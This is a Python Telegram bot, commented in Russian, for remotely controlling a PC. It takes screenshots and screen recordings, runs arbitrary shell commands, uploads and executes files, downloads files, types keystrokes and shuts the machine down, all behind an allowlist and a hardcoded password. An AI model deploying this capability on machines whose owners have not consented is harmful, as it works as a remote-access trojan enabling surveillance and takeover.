import telebot
import os
import subprocess
import time
import webbrowser
import numpy as np
from PIL import Image
from io import BytesIO
import platform
import natsort
import tempfile
import cv2
import pyautogui


BOT_TOKEN = ""
ALLOWED_USER_IDS = []
PASSWORD = "@dresny"
AUTHORIZED_USERS = {}

SCREENSHOT_PATH = "1.png"  # Путь для сохранения скриншотов
FILE_TRANSFER_FOLDER = r""  # Папка для передачи файлов (из бота на ПК)
FILE_SEND_FOLDER = r""  # Папка откуда бот будет отправлять файлы
EXE_FILE_PATH = None
MAX_FILE_SIZE_MB = 42 # Максимальный размер отправляемого файла (в MB)
bot = telebot.TeleBot(BOT_TOKEN)

def take_screenshot():
    try:
        image = pyautogui.screenshot()
        image.save(SCREENSHOT_PATH)
        return True
    except Exception as e:
        print(f"Ошибка при создании скриншота: {e}")
        return False

def shutdown_pc():
    """Выключает компьютер."""
    try:
        os.system("shutdown /s /t 1")  # Windows
        # subprocess.run(["shutdown", "-h", "now"]) #Linux
        return True
    except Exception as e:
        print(f"Ошибка при выключении ПК: {e}")
        return False

def display_message(message):
    try:
        import tkinter as tk
        import threading

        def show_message():
            root = tk.Tk()
            root.title("dildogram")
            label = tk.Label(root, text=message, padx=20, pady=10)
            label.pack()

            def close_window():
                root.destroy()
            root.after(5000, close_window)
            root.mainloop()

        thread = threading.Thread(target=show_message)
        thread.start()

        return True
    except Exception as e:
        print(f"Ошибка: {e}")
        return False

def open_link(url):
    """Открывает ссылку в браузере."""
    try:
        webbrowser.open(url)
        return True
    except Exception as e:
        print(f"Ошибка при открытии ссылки: {e}")
        return False

def run_file(file_path):
    """Запускает файл."""
    try:
        if platform.system() == 'Windows':
            os.startfile(file_path)  # Windows
        else:
            subprocess.Popen(['xdg-open', file_path])  # Linux/macOS
        return True
    except Exception as e:
        print(f"Ошибка при запуске файла: {e}")
        return False

def display_image(image_data):
    """Отображает изображение на экране на 5 секунд."""
    try:
        # Используем PIL для обработки изображения
        img = Image.open(BytesIO(image_data))

        # Используем pyautogui для отображения изображения
        # Сначала сохраняем изображение во временный файл
        temp_image_path = "temp_image.png"
        img.save(temp_image_path)

        # Используем tkinter для отображения изображения
        import tkinter as tk
        from PIL import ImageTk

        root = tk.Tk()
        root.title("Изображение")

        img = ImageTk.PhotoImage(Image.open(temp_image_path))
        panel = tk.Label(root, image=img)
        panel.pack(side="bottom", fill="both", expand="yes")
        def close_window():
            root.destroy()

        root.after(5000, close_window)

        root.mainloop()

        # Удаляем временный файл
        os.remove(temp_image_path)

        return True
    except Exception as e:
        print(f"Ошибка при отображении изображения: {e}")
        return False

def record_screen(duration):
    """Записывает экран на указанное количество секунд."""
    try:
        # Определяем параметры записи
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")  # Кодекк для записи видео
        fps = 20.0  # Кадры в секунду

        # Создаем временный файл для сохранения видео
        output_file = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
        output_path = output_file.name
        output_file.close()

        out = cv2.VideoWriter(output_path, fourcc, fps, screen_size)

        start_time = time.time()
        while time.time() - start_time < duration:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()
        cv2.destroyAllWindows()

        return output_path  # Возвращаем путь к записанному видео
    except Exception as e:
        print(f"Ошибка при записи экрана: {e}")
        return None

def execute_command(command):
    """Выполняет команду в терминале и возвращает результат."""
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Декодируем вывод в кодировке utf-8
        try:
            stdout = stdout.decode('utf-8')
        except UnicodeDecodeError:
            stdout = stdout.decode('cp866') #Попытка декодировать в другой кодировке

        try:
            stderr = stderr.decode('utf-8')
        except UnicodeDecodeError:
            stderr = stderr.decode('cp866')

        if stderr:
            return f"❌ Ошибка:\n{stderr}"
        return f"✅ Результат:\n{stdout}"
    except Exception as e:
        return f"❌ Ошибка при выполнении команды: {e}"

MAIN_MENU_KEYBOARD = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
MAIN_MENU_KEYBOARD.add(
    "⚙️ Выключение ПК",
    "📢 Вывод сообщения",
    "🖥️ Терминал", #Добавили кнопку терминал
    "🗂️ Категории",
    "🔙 Назад"
)

CATEGORIES_KEYBOARD = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
CATEGORIES_KEYBOARD.add(
    "🖥️ Экран",
    "📤 Получение данных",
    "📥 Ввод данных",
    "🔙 Назад"
)

SCREEN_KEYBOARD = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
SCREEN_KEYBOARD.add(
    "📸 Скриншот экрана",
    "🖼️ Вывести изображение",
    "⏺️ Запись экрана",
    "🔙 Назад"
)

GET_DATA_KEYBOARD = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
GET_DATA_KEYBOARD.add(
    "🗂️ Отправить файл с ПК",
    "🔙 Назад"
)

INPUT_DATA_KEYBOARD = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
INPUT_DATA_KEYBOARD.add(
    "🔗 Открыть ссылку",
    "💾 Отправить файл на ПК",
    "⌨️ Ввести текст",
    "🔙 Назад"
)

STATE_MAIN_MENU = "main_menu"
STATE_CATEGORIES = "categories"
STATE_SCREEN = "screen"
STATE_GET_DATA = "get_data"
STATE_INPUT_DATA = "input_data"
STATE_RECORD_SCREEN = "record_screen"
STATE_SEND_FILE_BROWSE = "send_file_browse"
STATE_INPUT_TEXT = "input_text"
STATE_TERMINAL = "terminal"
USER_STATES = {}  # Словарь для хранения состояний пользователей
USER_FILE_PATHS = {} # Для хранения пути, где пользователь


@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id

    if user_id in ALLOWED_USER_IDS:
        bot.send_message(user_id, "🔒 Введите пароль для доступа к командам:")
        bot.register_next_step_handler(message, process_password)
    else:
        bot.send_message(user_id, "🚫 У вас нет доступа к этому боту.")

def process_password(message):
    """Проверяет пароль и предоставляет доступ к командам."""
    user_id = message.from_user.id
    password = message.text

    if password == PASSWORD:
        AUTHORIZED_USERS[user_id] = True
        USER_STATES[user_id] = STATE_MAIN_MENU
        show_main_menu(message)
    else:
        bot.send_message(user_id, "❌ Неверный пароль. Попробуйте еще раз /start")

def show_main_menu(message):
    """Показывает главное меню."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        USER_STATES[user_id] = STATE_MAIN_MENU
        msg = bot.send_message(user_id, "🤖 Выберите команду:", reply_markup=MAIN_MENU_KEYBOARD)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def show_categories_menu(message):
    """Показывает меню категорий."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        USER_STATES[user_id] = STATE_CATEGORIES
        msg = bot.send_message(user_id, "🗂️ Выберите категорию:", reply_markup=CATEGORIES_KEYBOARD)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def show_screen_menu(message):
    """Показывает меню экрана."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        USER_STATES[user_id] = STATE_SCREEN
        msg = bot.send_message(user_id, "🖥️ Выберите действие:", reply_markup=SCREEN_KEYBOARD)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def show_get_data_menu(message):
    """Показывает меню получения данных."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        USER_STATES[user_id] = STATE_GET_DATA
        msg = bot.send_message(user_id, "📤 Выберите действие:", reply_markup=GET_DATA_KEYBOARD)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def show_input_data_menu(message):
    """Показывает меню ввода данных."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        USER_STATES[user_id] = STATE_INPUT_DATA
        msg = bot.send_message(user_id, "📥 Выберите действие:", reply_markup=INPUT_DATA_KEYBOARD)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def delete_message(user_id, message_id):
    """Удаляет сообщение."""
    try:
        bot.delete_message(user_id, message_id)
    except Exception as e:
        print(f"Не удалось удалить сообщение: {e}")

@bot.message_handler(func=lambda message: message.text == "📸 Скриншот экрана")
def handle_screenshot(message):
    """Обрабатывает запрос на создание скриншота."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_chat_action(user_id, 'upload_photo')
        if take_screenshot():
            with open(SCREENSHOT_PATH, 'rb') as photo:
                bot.send_photo(user_id, photo)
        else:
            bot.send_message(user_id, "❌ Не удалось сделать скриншот.")
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: message.text == "⚙️ Выключение ПК")
def handle_shutdown(message):
    """Обрабатывает запрос на выключение ПК."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "😴 Выключаю ПК...")
        if shutdown_pc():
            bot.send_message(user_id, "✅ ПК выключен.")
        else:
            bot.send_message(user_id, "❌ Не удалось выключить ПК.")
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: message.text == "📢 Вывод сообщения")
def handle_display_message(message):
    """Обрабатывает запрос на вывод сообщения на экран."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "📝 Введите сообщение для отображения на экране:")
        bot.register_next_step_handler(message, process_display_message)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def process_display_message(message):
    """Выводит сообщение на экран ПК."""
    user_id = message.from_user.id
    text = message.text

    if display_message(text):
        bot.send_message(user_id, "✅ Сообщение отображено на экране.")
    else:
        bot.send_message(user_id, "❌ Не удалось отобразить сообщение.")

    delete_message(user_id, message.message_id)

@bot.message_handler(func=lambda message: message.text == "🔗 Открыть ссылку")
def handle_open_link(message):
    """Обрабатывает запрос на открытие ссылки."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "🌐 Введите ссылку для открытия:")
        bot.register_next_step_handler(message, process_open_link)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def process_open_link(message):
    """Открывает ссылку в браузере на ПК."""
    user_id = message.from_user.id
    url = message.text

    if open_link(url):
        bot.send_message(user_id, "✅ Ссылка открыта в браузере.")
    else:
        bot.send_message(user_id, "❌ Не удалось открыть ссылку.")

    delete_message(user_id, message.message_id)

@bot.message_handler(func=lambda message: message.text == "💾 Отправить файл на ПК")
def handle_upload_file(message):
    """Обрабатывает запрос на отправку файла на ПК и выбор действия."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        # Создаем Inline Keyboard для выбора действия
        markup = telebot.types.InlineKeyboardMarkup()
        item1 = telebot.types.InlineKeyboardButton(text="1. Отправить файл", callback_data="upload_file")
        item2 = telebot.types.InlineKeyboardButton(text="2. Отправить и запустить файл", callback_data="upload_and_run_file")
        markup.add(item1, item2)
        bot.send_message(user_id, "⚙️ Выберите действие:", reply_markup=markup)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.callback_query_handler(func=lambda call: call.data in ["upload_file", "upload_and_run_file"])
def process_upload_choice(call):
    user_id = call.from_user.id
    action = call.data

    bot.send_message(user_id, "📤 Отправьте файл для сохранения на ПК:")
    bot.register_next_step_handler(call.message, process_upload_file, action)
    delete_message(user_id, call.message.message_id) #Удаляем сообщение с кнопками выбора

def process_upload_file(message, action):
    """Сохраняет полученный от пользователя файл на ПК и, возможно, запускает его."""
    user_id = message.from_user.id
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name
            file_path = os.path.join(FILE_TRANSFER_FOLDER, file_name)

            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(user_id, f"✅ Файл '{file_name}' сохранен на ПК.")

            if action == "upload_and_run_file":
                if run_file(file_path):
                    bot.send_message(user_id, "🚀 Файл запущен.")
                else:
                    bot.send_message(user_id, "❌ Не удалось запустить файл.")
                delete_message(user_id, message.message_id)  # Удаляем сообщение после запуска
            else:
                delete_message(user_id, message.message_id)  #Удаляем сообщение если не надо запускать файл

        except Exception as e:
            bot.send_message(user_id, f"❌ Не удалось сохранить файл: {e}")
            delete_message(user_id, message.message_id)  # Удаляем сообщение об ошибке
    else:
        bot.send_message(user_id, "⚠️ Пожалуйста, отправьте файл как документ.")
        delete_message(user_id, message.message_id)  # Удаляем сообщение с предупреждением

@bot.message_handler(func=lambda message: message.text == "🖼️ Вывести изображение", content_types=['photo'])
def handle_display_photo_request(message):
    """Обрабатывает нажатие кнопки "Вывести изображение"."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "📸 Пожалуйста, отправьте фотографию для отображения.")
        bot.register_next_step_handler(message, process_display_photo)  # Переходим к следующему шагу - ожиданию фото
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(content_types=['photo'])  # Этот обработчик принимает только фото
def process_display_photo(message):
    """Обрабатывает полученную фотографию и отображает ее на экране."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        try:
            # Получаем информацию о фотографии
            file_id = message.photo[-1].file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            # Отображаем изображение на экране
            if display_image(downloaded_file):
                bot.send_message(user_id, "✅ Изображение отображено на экране на 5 секунд.")
            else:
                bot.send_message(user_id, "❌ Не удалось отобразить изображение.")
        except Exception as e:
            bot.send_message(user_id, f"❌ Ошибка при обработке изображения: {e}")
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

    delete_message(user_id, message.message_id)

# === НОВЫЙ ФУНКЦИОНАЛ ===
@bot.message_handler(func=lambda message: message.text == "⏺️ Запись экрана")
def handle_record_screen(message):
    """Обрабатывает запрос на запись экрана."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "⏳ Введите количество секунд для записи экрана:")
        bot.register_next_step_handler(message, process_record_duration)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def process_record_duration(message):
    """Обрабатывает ввод продолжительности записи экрана."""
    user_id = message.from_user.id
    try:
        duration = int(message.text)
        if duration <= 0:
            bot.send_message(user_id, "⚠️ Пожалуйста, введите положительное число секунд.")
            delete_message(user_id, message.message_id)
            return

        bot.send_chat_action(user_id, 'record_video')  #Показываем что бот записывает видео
        video_path = record_screen(duration)

        if video_path:
            with open(video_path, 'rb') as video:
                bot.send_video(user_id, video)
            os.remove(video_path)  # Удаляем временный файл
            bot.send_message(user_id, "✅ Запись экрана завершена и отправлена.")
        else:
            bot.send_message(user_id, "❌ Не удалось записать экран.")

        delete_message(user_id, message.message_id)

    except ValueError:
        bot.send_message(user_id, "⚠️ Пожалуйста, введите целое число секунд.")
        delete_message(user_id, message.message_id)

# Функция для просмотра файлов
def browse_files(user_id, path):
    """Отправляет пользователю список файлов и папок в указанном пути."""
    try:
        files = os.listdir(path)
        files = natsort.natsorted(files)  # Сортировка как в проводнике Windows

        markup = telebot.types.InlineKeyboardMarkup()
        for file in files:
            file_path = os.path.join(path, file)
            relative_path = os.path.relpath(file_path, FILE_SEND_FOLDER)
            file_size_mb = os.path.getsize(file_path) / (1024 * 1024)

            if os.path.isfile(file_path):
                if file_size_mb <= MAX_FILE_SIZE_MB:
                    button_text = f"📄 {file} ({file_size_mb:.2f} MB)"
                    callback_data = f"sendfile:{relative_path}"
                else:
                    button_text = f"📄 {file} (Размер > {MAX_FILE_SIZE_MB} MB)"
                    callback_data = "ignore"
            elif os.path.isdir(file_path):
                button_text = f"📂 {file}"
                callback_data = f"browse:{relative_path}"
            else:
                continue

            if callback_data == "ignore":
                markup.add(telebot.types.InlineKeyboardButton(text=button_text, callback_data="ignore"))
            else:
                markup.add(telebot.types.InlineKeyboardButton(text=button_text, callback_data=callback_data))

        if path != FILE_SEND_FOLDER:
            parent_dir = os.path.dirname(path)
            relative_parent_dir = os.path.relpath(parent_dir, FILE_SEND_FOLDER)
            markup.add(telebot.types.InlineKeyboardButton(text="🔙 Назад", callback_data=f"browse:{relative_parent_dir}"))

        bot.send_message(user_id, f"🗂️ Содержимое папки: {path}", reply_markup=markup)

    except Exception as e:
        bot.send_message(user_id, f"❌ Ошибка при просмотре файлов: {e}")

@bot.message_handler(func=lambda message: message.text == "🗂️ Отправить файл с ПК")
def handle_send_file(message):
    """Обрабатывает запрос на отправку файла с ПК."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        USER_STATES[user_id] = STATE_SEND_FILE_BROWSE  # Ставим состояние просмотра файлов
        USER_FILE_PATHS[user_id] = FILE_SEND_FOLDER  # Запоминаем путь к папке пользователя
        browse_files(user_id, FILE_SEND_FOLDER)  # Открываем файловый менеджер в боте
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.callback_query_handler(func=lambda call: call.data.startswith("browse:"))
def callback_browse_files(call):
    """Обрабатывает навигацию по папкам."""
    user_id = call.from_user.id
    relative_path = call.data.split(":")[1]
    path = os.path.join(FILE_SEND_FOLDER, relative_path).replace("\\","/")  # Формируем полный путь
    if os.path.isdir(path):
        USER_FILE_PATHS[user_id] = path
        browse_files(user_id, path)
    else:
        bot.answer_callback_query(call.id, "⚠️ Это не папка!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("sendfile:"))
def callback_send_file(call):
    user_id = call.from_user.id
    relative_path = call.data.split(":")[1]
    file_path = os.path.join(FILE_SEND_FOLDER, relative_path).replace("\\","/")  # Формируем полный путь

    try:
        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb <= MAX_FILE_SIZE_MB:
            with open(file_path, 'rb') as file:
                bot.send_document(user_id, file)
            bot.send_message(user_id, "✅ Файл отправлен.")
        else:
             bot.send_message(user_id, f"❌ Размер файла превышает {MAX_FILE_SIZE_MB} MB.")
    except Exception as e:
        bot.send_message(user_id, f"❌ Не удалось отправить файл: {e}")

#Ввод текста
@bot.message_handler(func=lambda message: message.text == "⌨️ Ввести текст")
def handle_input_text(message):
    """Обрабатывает запрос на ввод текста."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "✍️ Введите текст для вставки:")
        USER_STATES[user_id] = STATE_INPUT_TEXT
        bot.register_next_step_handler(message, process_input_text)
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

def process_input_text(message):
    user_id = message.from_user.id
    text = message.text

    try:
        pyautogui.typewrite(text)
        bot.send_message(user_id, "✅ Текст вставлен.")
    except Exception as e:
        bot.send_message(user_id, f"❌ Не удалось вставить текст: {e}")

    USER_STATES[user_id] = STATE_INPUT_DATA
    delete_message(user_id, message.message_id)

@bot.message_handler(func=lambda message: message.text == "🖥️ Терминал")
def handle_terminal(message):
    """Обрабатывает запрос на открытие терминала."""
    user_id = message.from_user.id

    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.send_message(user_id, "💻 Введите команду для выполнения (или 'exit' для выхода):", parse_mode="Markdown")
        USER_STATES[user_id] = STATE_TERMINAL
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: USER_STATES.get(message.from_user.id) == STATE_TERMINAL)
def process_terminal_command(message):
    """Выполняет команды в терминале."""
    user_id = message.from_user.id
    command = message.text

    if command.lower() == "exit":
        USER_STATES[user_id] = STATE_MAIN_MENU
        bot.send_message(user_id, "✅ Выход из режима терминала.", reply_markup=MAIN_MENU_KEYBOARD)
    else:
        result = execute_command(command)
        bot.send_message(user_id, f"💻 Команда: `{command}`\n{result}", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🗂️ Категории")
def handle_categories(message):
    """Обрабатывает запрос на показ категорий."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        show_categories_menu(message)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: message.text == "🖥️ Экран")
def handle_screen(message):
    """Обрабатывает запрос на показ меню экрана."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        show_screen_menu(message)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: message.text == "📤 Получение данных")
def handle_get_data(message):
    """Обрабатывает запрос на показ меню получения данных."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        show_get_data_menu(message)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: message.text == "📥 Ввод данных")
def handle_input_data(message):
    """Обрабатывает запрос на показ меню ввода данных."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        show_input_data_menu(message)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: message.text == "🔙 Назад")
def handle_back(message):
    """Обрабатывает нажатие кнопки "Назад"."""
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        current_state = USER_STATES.get(user_id)

        if current_state == STATE_CATEGORIES or current_state == STATE_MAIN_MENU:
            show_main_menu(message)
        elif current_state == STATE_GET_DATA or current_state == STATE_INPUT_DATA or current_state == STATE_SCREEN:
            show_categories_menu(message)
        elif current_state == STATE_SEND_FILE_BROWSE:  #Если в файловом менеджере
            show_get_data_menu(message)
        elif current_state == STATE_TERMINAL: #Если в режиме терминала
            show_main_menu(message)
        else:
            show_main_menu(message)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    user_id = message.from_user.id
    if user_id in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id]:
        bot.reply_to(message, "⚠️ Неизвестная команда.  Выберите команду из меню.")
        delete_message(user_id, message.message_id)
    else:
        bot.send_message(user_id, "🚫 Пожалуйста, сначала введите пароль /start")


if __name__ == '__main__':
    print("Работаем...")
    bot.infinity_polling()
